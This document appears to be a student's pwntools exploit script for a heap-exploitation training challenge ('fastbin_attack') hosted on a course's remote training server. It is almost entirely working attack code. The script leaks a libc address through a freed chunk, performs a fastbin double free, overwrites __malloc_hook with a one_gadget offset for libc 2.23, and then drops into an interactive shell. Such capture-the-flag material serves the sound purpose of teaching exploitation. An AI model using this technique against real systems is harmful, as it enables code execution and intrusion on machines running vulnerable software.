#use ldd ./fastbin_attack to check the libraries used by the program

# output on your machine
#   linux-vdso.so.1 (0x00007ffde3f9b000)
#	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc6cd597000)
#	/lib64/ld-linux-x86-64.so.2 (0x00007fc6cd99d000)

# output on prof's VM
#   linux-vdso.so.1 (0x00007ffff7ffb000)
#	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77df000)
#	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)

#To use another library we have a few options
#1.   LD_PRELOAD = ./libc-2.23.so ./fastbin_attack


#     before that you need to do
#     mv libc-2.23.so libc.so.6
#2    ./ld-2.23.so --library-path ./  ./fastbin_attack


LEAK_OFFSET = 0x3c4b78
MALLOC_HOOK_OFFSET = 0x3c4b10
DELTA_HOOK = 0x23
MAGIC = 0xf1247

from pwn import *
import re
libc = ELF("./libc-2.23.so")
#context.terminal = ['tmux', 'splitw', '-h']
#ssh = ssh("acidburn", "192.168.56.103")
#r = ssh.process("./fastbin_attack")
r = remote("training.jinblack.it",10101)
#gdb.attach(r, """
	# brva 0x0c21 fastbin_attack
#	c
#	""")

input("wait")

def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    indexline = r.recvuntil("!")
    #Allocated at index 0!
    m = re.match(b"Allocated at index (\d+)!", indexline)
    return int(m.group(1))

def write_chunk(index, content):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(content)

def read_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    data = r.recvuntil(b"Options:\n")
    return data[:-len(b"Options:\n")]

def free_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)


chunk_a = alloc(0x200)
chunk_b = alloc(0x30)
free_chunk(chunk_a)
libc_leak = u64(read_chunk(chunk_a)[:6]+b"\x00\x00")
libc_base = libc_leak - 0x3c4b78
libc.address = libc_base
free_hook = libc.symbols["__free_hook"]
malloc_hook = libc.symbols["__malloc_hook"]

target = malloc_hook - 0x23

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
print("[!] free_hook: %#x" % free_hook)
print("[!] malloc_hook: %#x" % malloc_hook)
print("[!] target: %#x" % target)

SIZE = 0x60

chunk_1 = alloc(SIZE)
chunk_2 = alloc(SIZE)


free_chunk(chunk_1)
free_chunk(chunk_2)
free_chunk(chunk_1)


chunk_A = alloc(SIZE)
write_chunk(chunk_A, p64(target))


chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE)

print("trigger")

chunk_D = alloc(SIZE)

payload = b"A" *(DELTA_HOOK-0x10)
payload += p64(libc_base+ MAGIC)
write_chunk(7,payload)


r.interactive()
